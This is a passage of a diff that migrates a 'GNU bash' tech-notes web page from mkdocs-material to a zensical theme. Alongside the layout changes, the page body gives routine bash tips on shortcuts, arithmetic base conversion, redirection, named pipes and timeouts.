@@ -6,11 +6,11 @@
       <meta charset="utf-8">
       <meta name="viewport" content="width=device-width,initial-scale=1">
       
+        <meta name="description" content="A new project generated from the default template project.">
       
-        <meta name="author" content="Daniel Austin Hoherd">
       
+        <meta name="author" content="<your name here>">
       
-        <link rel="canonical" href="https://danielhoherd.com/tech-notes/bash/">
       
       
         <link rel="prev" href="../badblocks/">
@@ -23,15 +23,23 @@
       
       
       <link rel="icon" href="../assets/images/favicon.png">
-      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.2">
+      <meta name="generator" content="zensical-0.0.23">
     
     
       
-        <title>GNU bash - Daniel Hoherd's tech notes</title>
+        <title>GNU bash - Documentation</title>
       
     
     
-      <link rel="stylesheet" href="../assets/stylesheets/main.484c7ddc.min.css">
+      
+        
+      
+      <link rel="stylesheet" href="../assets/stylesheets/modern/main.1e989742.min.css">
+      
+        
+          
+        
+        <link rel="stylesheet" href="../assets/stylesheets/modern/palette.dfe2e883.min.css">
       
       
 
@@ -45,14 +53,12 @@
         
         
         <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
-        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Inter:300,300i,400,400i,500,500i,700,700i%7CJetBrains+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Inter";--md-code-font:"JetBrains Mono"}</style>
       
     
     
-      <link rel="stylesheet" href="../static_assets/custom.css">
-    
-    <script>__md_scope=new URL("..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    <script>__md_scope=new URL("..",location),__md_hash=e=>[...e].reduce(((e,t)=>(e<<5)-e+t.charCodeAt(0)),0),__md_get=(e,t=localStorage,a=__md_scope)=>JSON.parse(t.getItem(a.pathname+"."+e)),__md_set=(e,t,a=localStorage,_=__md_scope)=>{try{a.setItem(_.pathname+"."+e,JSON.stringify(t))}catch(e){}},document.documentElement.setAttribute("data-platform",navigator.platform)</script>
     
       
 
@@ -61,7 +67,14 @@
   </head>
   
   
-    <body dir="ltr">
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo">
   
     
     <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
@@ -86,21 +99,21 @@
 
 <header class="md-header md-header--shadow" data-md-component="header">
   <nav class="md-header__inner md-grid" aria-label="Header">
-    <a href=".." title="Daniel Hoherd&#39;s tech notes" class="md-header__button md-logo" aria-label="Daniel Hoherd's tech notes" data-md-component="logo">
+    <a href="./.." title="Documentation" class="md-header__button md-logo" aria-label="Documentation" data-md-component="logo">
       
   
-  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+  <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-book-open" viewBox="0 0 24 24"><path d="M12 7v14M3 18a1 1 0 0 1-1-1V4a1 1 0 0 1 1-1h5a4 4 0 0 1 4 4 4 4 0 0 1 4-4h5a1 1 0 0 1 1 1v13a1 1 0 0 1-1 1h-6a3 3 0 0 0-3 3 3 3 0 0 0-3-3z"/></svg>
 
     </a>
     <label class="md-header__button md-icon" for="__drawer">
       
-      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+      <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-menu" viewBox="0 0 24 24"><path d="M4 5h16M4 12h16M4 19h16"/></svg>
     </label>
     <div class="md-header__title" data-md-component="header-title">
       <div class="md-header__ellipsis">
         <div class="md-header__topic">
           <span class="md-ellipsis">
-            Daniel Hoherd's tech notes
+            Documentation
           </span>
         </div>
         <div class="md-header__topic" data-md-component="header-topic">
@@ -113,6 +126,32 @@
       </div>
     </div>
     
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="none" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-sun" viewBox="0 0 24 24"><circle cx="12" cy="12" r="4"/><path d="M12 2v2M12 20v2M4.93 4.93l1.41 1.41M17.66 17.66l1.41 1.41M2 12h2M20 12h2M6.34 17.66l-1.41 1.41M19.07 4.93l-1.41 1.41"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="none" data-md-color-scheme="slate" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-moon" viewBox="0 0 24 24"><path d="M20.985 12.486a9 9 0 1 1-9.473-9.472c.405-.022.617.46.402.803a6 6 0 0 0 8.268 8.268c.344-.215.825-.004.803.401"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
     
       <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
     
@@ -122,43 +161,18 @@
       
         <label class="md-header__button md-icon" for="__search">
           
-          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+          <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-search" viewBox="0 0 24 24"><path d="m21 21-4.34-4.34"/><circle cx="11" cy="11" r="8"/></svg>
         </label>
-        <div class="md-search" data-md-component="search" role="dialog">
-  <label class="md-search__overlay" for="__search"></label>
-  <div class="md-search__inner" role="search">
-    <form class="md-search__form" name="search">
-      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
-      <label class="md-search__icon md-icon" for="__search">
-        
-        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
-        
-        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
-      </label>
-      <nav class="md-search__options" aria-label="Search">
-        
-        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
-          
-          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
-        </button>
-      </nav>
-      
-    </form>
-    <div class="md-search__output">
-      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
-        <div class="md-search-result" data-md-component="search-result">
-          <div class="md-search-result__meta">
-            Initializing search
-          </div>
-          <ol class="md-search-result__list" role="presentation"></ol>
-        </div>
-      </div>
-    </div>
-  </div>
+        <div class="md-search" data-md-component="search" role="dialog" aria-label="Search">
+  <button type="button" class="md-search__button">
+    Search
+  </button>
 </div>
       
     
-    
+    <div class="md-header__source">
+      
+    </div>
   </nav>
   
 </header>
@@ -184,13 +198,13 @@
 
 <nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
   <label class="md-nav__title" for="__drawer">
-    <a href=".." title="Daniel Hoherd&#39;s tech notes" class="md-nav__button md-logo" aria-label="Daniel Hoherd's tech notes" data-md-component="logo">
+    <a href="./.." title="Documentation" class="md-nav__button md-logo" aria-label="Documentation" data-md-component="logo">
       
   
-  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+  <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-book-open" viewBox="0 0 24 24"><path d="M12 7v14M3 18a1 1 0 0 1-1-1V4a1 1 0 0 1 1-1h5a4 4 0 0 1 4 4 4 4 0 0 1 4-4h5a1 1 0 0 1 1 1v13a1 1 0 0 1-1 1h-6a3 3 0 0 0-3 3 3 3 0 0 0-3-3z"/></svg>
 
     </a>
-    Daniel Hoherd's tech notes
+    Documentation
   </label>
   
   <ul class="md-nav__list" data-md-scrollfix>
@@ -202,7 +216,7 @@
   
   
     <li class="md-nav__item">
-      <a href=".." class="md-nav__link">
+      <a href="./.." class="md-nav__link">
         
   
   
@@ -823,7 +837,7 @@
           <span class="md-nav__icon md-icon"></span>
         </label>
       
-      <a href="./" class="md-nav__link md-nav__link--active">
+      <a href="././" class="md-nav__link md-nav__link--active">
         
   
   
@@ -842,7 +856,8 @@
       
         
 
-<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+
+<nav class="md-nav md-nav--secondary" aria-label="On this page">
   
   
   
@@ -851,7 +866,7 @@
   
     <label class="md-nav__title" for="__toc">
       <span class="md-nav__icon md-icon"></span>
-      Table of contents
+      On this page
     </label>
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
@@ -10705,7 +10720,8 @@
                   <div class="md-sidebar__inner">
                     
 
-<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+
+<nav class="md-nav md-nav--secondary" aria-label="On this page">
   
   
   
@@ -10714,7 +10730,7 @@
   
     <label class="md-nav__title" for="__toc">
       <span class="md-nav__icon md-icon"></span>
-      Table of contents
+      On this page
     </label>
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
@@ -11297,16 +11313,22 @@
           
             <div class="md-content" data-md-component="content">
               
+                
+
+
+
+  
+
+
+              
               <article class="md-content__inner md-typeset">
                 
                   
 
-
-
-<h1 id="gnu-bash">GNU bash</h1>
+<h1 id="gnu-bash">GNU bash<a class="headerlink" href="#gnu-bash" title="Permanent link">&para;</a></h1>
 <p>Bash is one of the most common mainstream unix shells.</p>
-<h2 id="tips-and-usage-examples">Tips and Usage Examples</h2>
-<h3 id="navigating-on-the-command-line">Navigating on the command line</h3>
+<h2 id="tips-and-usage-examples">Tips and Usage Examples<a class="headerlink" href="#tips-and-usage-examples" title="Permanent link">&para;</a></h2>
+<h3 id="navigating-on-the-command-line">Navigating on the command line<a class="headerlink" href="#navigating-on-the-command-line" title="Permanent link">&para;</a></h3>
 <p>The following can be seen by running: <code>stty -a</code></p>
 <ul>
 <li>ctrl-a - move cursor to the beginning of the line</li>
@@ -11316,7 +11338,7 @@
 <li>ctrl-t - get status of foreground process</li>
 <li>ctrl-w - delete previous word</li>
 </ul>
-<h3 id="view-a-list-of-all-commands-etc">View a list of all commands, etc..</h3>
+<h3 id="view-a-list-of-all-commands-etc">View a list of all commands, etc..<a class="headerlink" href="#view-a-list-of-all-commands-etc" title="Permanent link">&para;</a></h3>
 <ul>
 <li><code>compgen -b</code> will list all the built-ins you could run.</li>
 <li><code>compgen -a</code> will list all the aliases you could run.</li>
@@ -11325,240 +11347,240 @@
 <li><code>compgen -A</code> function will list all the functions you could run.</li>
 <li><code>compgen -back</code> will list all the above in one go.</li>
 </ul>
-<h3 id="remove-leading-zeroes">Remove leading zeroes</h3>
+<h3 id="remove-leading-zeroes">Remove leading zeroes<a class="headerlink" href="#remove-leading-zeroes" title="Permanent link">&para;</a></h3>
 <p>This method converts the numbers from base-10 to base-10, which has the side effect of removing leading zeroes. You can also use this to convert from other base systems</p>
-<pre><code class="language-bash">for X in 00{1..20..2} ; do
-  echo &quot;$X = $(( 10#${X} ))&quot;
-done
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="k">for</span><span class="w"> </span>X<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="m">00</span><span class="o">{</span><span class="m">1</span>..20..2<span class="o">}</span><span class="w"> </span><span class="p">;</span><span class="w"> </span><span class="k">do</span>
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="w">  </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;</span><span class="nv">$X</span><span class="s2"> = </span><span class="k">$((</span><span class="w"> </span><span class="m">10#</span><span class="si">${</span><span class="nv">X</span><span class="si">}</span><span class="w"> </span><span class="k">))</span><span class="s2">&quot;</span>
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a><span class="k">done</span>
+</span></code></pre></div>
 <p>Or use <code>bc</code>, a CLI calculator...</p>
-<pre><code class="language-bash">for X in {1..50..5} ; do
-  Y=00${X}
-  echo &quot;${X} with zeroes is ${Y} and removed with bc is $(echo ${Y} | bc)&quot;
-done ;
-</code></pre>
-<h3 id="print-several-files-side-by-side">Print several files side by side</h3>
-<pre><code class="language-bash">printf &quot;%s\n&quot; {a..z} &gt; alpha.txt
-printf &quot;%s\n&quot; {1..26} &gt; num.txt
-pr -w 10 -t -m alpha.txt num.txt
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="k">for</span><span class="w"> </span>X<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="o">{</span><span class="m">1</span>..50..5<span class="o">}</span><span class="w"> </span><span class="p">;</span><span class="w"> </span><span class="k">do</span>
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a><span class="w">  </span><span class="nv">Y</span><span class="o">=</span><span class="m">00</span><span class="si">${</span><span class="nv">X</span><span class="si">}</span>
+</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a><span class="w">  </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;</span><span class="si">${</span><span class="nv">X</span><span class="si">}</span><span class="s2"> with zeroes is </span><span class="si">${</span><span class="nv">Y</span><span class="si">}</span><span class="s2"> and removed with bc is </span><span class="k">$(</span><span class="nb">echo</span><span class="w"> </span><span class="si">${</span><span class="nv">Y</span><span class="si">}</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>bc<span class="k">)</span><span class="s2">&quot;</span>
+</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a><span class="k">done</span><span class="w"> </span><span class="p">;</span>
+</span></code></pre></div>
+<h3 id="print-several-files-side-by-side">Print several files side by side<a class="headerlink" href="#print-several-files-side-by-side" title="Permanent link">&para;</a></h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="nb">printf</span><span class="w"> </span><span class="s2">&quot;%s\n&quot;</span><span class="w"> </span><span class="o">{</span>a..z<span class="o">}</span><span class="w"> </span>&gt;<span class="w"> </span>alpha.txt
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="nb">printf</span><span class="w"> </span><span class="s2">&quot;%s\n&quot;</span><span class="w"> </span><span class="o">{</span><span class="m">1</span>..26<span class="o">}</span><span class="w"> </span>&gt;<span class="w"> </span>num.txt
+</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>pr<span class="w"> </span>-w<span class="w"> </span><span class="m">10</span><span class="w"> </span>-t<span class="w"> </span>-m<span class="w"> </span>alpha.txt<span class="w"> </span>num.txt
+</span></code></pre></div>
 <p>The following output will be printed:</p>
-<pre><code>a    1
-b    2
-c    3
-d    4
-e    5
-f    6
-g    7
-h    8
-i    9
-j    10
-k    11
-l    12
-m    13
-n    14
-o    15
-p    16
-q    17
-r    18
-s    19
-t    20
-u    21
-v    22
-w    23
-x    24
-y    25
-z    26
-</code></pre>
-<h3 id="convert-base-36-to-decimal">Convert base 36 to decimal</h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>a    1
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>b    2
+</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>c    3
+</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a>d    4
+</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a>e    5
+</span><span id="__span-3-6"><a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a>f    6
+</span><span id="__span-3-7"><a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a>g    7
+</span><span id="__span-3-8"><a id="__codelineno-3-8" name="__codelineno-3-8" href="#__codelineno-3-8"></a>h    8
+</span><span id="__span-3-9"><a id="__codelineno-3-9" name="__codelineno-3-9" href="#__codelineno-3-9"></a>i    9
+</span><span id="__span-3-10"><a id="__codelineno-3-10" name="__codelineno-3-10" href="#__codelineno-3-10"></a>j    10
+</span><span id="__span-3-11"><a id="__codelineno-3-11" name="__codelineno-3-11" href="#__codelineno-3-11"></a>k    11
+</span><span id="__span-3-12"><a id="__codelineno-3-12" name="__codelineno-3-12" href="#__codelineno-3-12"></a>l    12
+</span><span id="__span-3-13"><a id="__codelineno-3-13" name="__codelineno-3-13" href="#__codelineno-3-13"></a>m    13
+</span><span id="__span-3-14"><a id="__codelineno-3-14" name="__codelineno-3-14" href="#__codelineno-3-14"></a>n    14
+</span><span id="__span-3-15"><a id="__codelineno-3-15" name="__codelineno-3-15" href="#__codelineno-3-15"></a>o    15
+</span><span id="__span-3-16"><a id="__codelineno-3-16" name="__codelineno-3-16" href="#__codelineno-3-16"></a>p    16
+</span><span id="__span-3-17"><a id="__codelineno-3-17" name="__codelineno-3-17" href="#__codelineno-3-17"></a>q    17
+</span><span id="__span-3-18"><a id="__codelineno-3-18" name="__codelineno-3-18" href="#__codelineno-3-18"></a>r    18
+</span><span id="__span-3-19"><a id="__codelineno-3-19" name="__codelineno-3-19" href="#__codelineno-3-19"></a>s    19
+</span><span id="__span-3-20"><a id="__codelineno-3-20" name="__codelineno-3-20" href="#__codelineno-3-20"></a>t    20
+</span><span id="__span-3-21"><a id="__codelineno-3-21" name="__codelineno-3-21" href="#__codelineno-3-21"></a>u    21
+</span><span id="__span-3-22"><a id="__codelineno-3-22" name="__codelineno-3-22" href="#__codelineno-3-22"></a>v    22
+</span><span id="__span-3-23"><a id="__codelineno-3-23" name="__codelineno-3-23" href="#__codelineno-3-23"></a>w    23
+</span><span id="__span-3-24"><a id="__codelineno-3-24" name="__codelineno-3-24" href="#__codelineno-3-24"></a>x    24
+</span><span id="__span-3-25"><a id="__codelineno-3-25" name="__codelineno-3-25" href="#__codelineno-3-25"></a>y    25
+</span><span id="__span-3-26"><a id="__codelineno-3-26" name="__codelineno-3-26" href="#__codelineno-3-26"></a>z    26
+</span></code></pre></div>
+<h3 id="convert-base-36-to-decimal">Convert base 36 to decimal<a class="headerlink" href="#convert-base-36-to-decimal" title="Permanent link">&para;</a></h3>
 <p>This converts the base 36 number z to a decimal value</p>
-<pre><code class="language-bash">echo $((36#z))
-</code></pre>
-<h3 id="run-a-command-for-5-seconds-then-kill-it">Run a command for 5 seconds, then kill it</h3>
-<pre><code class="language-bash">ping -f &amp; sleep 5 ; kill %1
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="nb">echo</span><span class="w"> </span><span class="k">$((</span><span class="m">36#z</span><span class="k">))</span>
+</span></code></pre></div>
+<h3 id="run-a-command-for-5-seconds-then-kill-it">Run a command for 5 seconds, then kill it<a class="headerlink" href="#run-a-command-for-5-seconds-then-kill-it" title="Permanent link">&para;</a></h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>ping<span class="w"> </span>-f<span class="w"> </span><span class="p">&amp;</span><span class="w"> </span>sleep<span class="w"> </span><span class="m">5</span><span class="w"> </span><span class="p">;</span><span class="w"> </span><span class="nb">kill</span><span class="w"> </span>%1
+</span></code></pre></div>
 <p>Alternatively, use the timeout command if it's available. In macOS this can be installed through <code>brew install coreutils</code> and accessed with <code>gtimeout</code>.</p>
-<pre><code class="language-bash">timeout 300 cmd
-</code></pre>
-<h3 id="test-if-a-variable-is-empty">Test if a variable is empty</h3>
-<pre><code class="language-bash">if [[ -z &quot;$var&quot; ]]
-</code></pre>
-<h3 id="date">Date</h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>timeout<span class="w"> </span><span class="m">300</span><span class="w"> </span>cmd
+</span></code></pre></div>
+<h3 id="test-if-a-variable-is-empty">Test if a variable is empty<a class="headerlink" href="#test-if-a-variable-is-empty" title="Permanent link">&para;</a></h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="k">if</span><span class="w"> </span><span class="o">[[</span><span class="w"> </span>-z<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$var</span><span class="s2">&quot;</span><span class="w"> </span><span class="o">]]</span>
+</span></code></pre></div>
+<h3 id="date">Date<a class="headerlink" href="#date" title="Permanent link">&para;</a></h3>
 <p>For date stuff, see <a href="../date/">date</a>, because it differs by platform.</p>
-<h3 id="show-random-statistics">Show RANDOM statistics</h3>
-<pre><code class="language-bash">for X in {0..9999} ; do
-  echo $(($RANDOM % 5)) ;
-done |
-sort |
-uniq -c
-</code></pre>
-<h3 id="named-pipes">named pipes</h3>
-<pre><code class="language-bash">mkfifo baz ; ps aux &gt; baz
-</code></pre>
+<h3 id="show-random-statistics">Show RANDOM statistics<a class="headerlink" href="#show-random-statistics" title="Permanent link">&para;</a></h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="k">for</span><span class="w"> </span>X<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="o">{</span><span class="m">0</span>..9999<span class="o">}</span><span class="w"> </span><span class="p">;</span><span class="w"> </span><span class="k">do</span>
+</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a><span class="w">  </span><span class="nb">echo</span><span class="w"> </span><span class="k">$((</span><span class="nv">$RANDOM</span><span class="w"> </span><span class="o">%</span><span class="w"> </span><span class="m">5</span><span class="k">))</span><span class="w"> </span><span class="p">;</span>
+</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a><span class="k">done</span><span class="w"> </span><span class="p">|</span>
+</span><span id="__span-8-4"><a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a>sort<span class="w"> </span><span class="p">|</span>
+</span><span id="__span-8-5"><a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a>uniq<span class="w"> </span>-c
+</span></code></pre></div>
+<h3 id="named-pipes">named pipes<a class="headerlink" href="#named-pipes" title="Permanent link">&para;</a></h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>mkfifo<span class="w"> </span>baz<span class="w"> </span><span class="p">;</span><span class="w"> </span>ps<span class="w"> </span>aux<span class="w"> </span>&gt;<span class="w"> </span>baz
+</span></code></pre></div>
 <p>then, in another terminal</p>
-<pre><code>cat baz
-</code></pre>
-<h3 id="alternate-redirection-outputs">alternate redirection outputs</h3>
-<pre><code class="language-bash">exec 3&gt; /tmp/baz ; ps aux &gt;&amp;3 # sends the output of ps aux to /tmp/baz
-</code></pre>
-<h3 id="redirect-all-output-of-a-script-into-a-file">Redirect all output of a script into a file</h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>cat baz
+</span></code></pre></div>
+<h3 id="alternate-redirection-outputs">alternate redirection outputs<a class="headerlink" href="#alternate-redirection-outputs" title="Permanent link">&para;</a></h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="nb">exec</span><span class="w"> </span><span class="m">3</span>&gt;<span class="w"> </span>/tmp/baz<span class="w"> </span><span class="p">;</span><span class="w"> </span>ps<span class="w"> </span>aux<span class="w"> </span>&gt;<span class="p">&amp;</span><span class="m">3</span><span class="w"> </span><span class="c1"># sends the output of ps aux to /tmp/baz</span>
+</span></code></pre></div>
+<h3 id="redirect-all-output-of-a-script-into-a-file">Redirect all output of a script into a file<a class="headerlink" href="#redirect-all-output-of-a-script-into-a-file" title="Permanent link">&para;</a></h3>
 <p>This is not bash specific, but works in bash.</p>
-<pre><code class="language-bash">##!/usr/bin/env bash
-
-exec &gt;&gt; /tmp/$0.log
-exec 2&gt;&amp;1
-
-date &quot;+%F %T%z $0 This is stdout, and will be written to the log&quot;
-date &quot;+%F %T%z $0 This is stderr, and will also be written to the log&quot;
-</code></pre>
-<h3 id="show-size-of-each-users-home-folder">Show size of each user's home folder</h3>
-<pre><code class="language-bash">getent passwd |
-while IFS=: read -r user _ uid _ _ home _ ; do
-  if [[ $uid -ge 500 ]] ; then
-    printf &quot;$user &quot; ;
-    sudo du -sh $home ;
-  fi ;
-done
-</code></pre>
-<h3 id="previous-commands-args">Previous command's args</h3>
-<pre><code class="language-bash">mkdir temp ; cd !!:*
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="c1">##!/usr/bin/env bash</span>
+</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>
+</span><span id="__span-12-3"><a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a><span class="nb">exec</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>/tmp/<span class="nv">$0</span>.log
+</span><span id="__span-12-4"><a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a><span class="nb">exec</span><span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span>
+</span><span id="__span-12-5"><a id="__codelineno-12-5" name="__codelineno-12-5" href="#__codelineno-12-5"></a>
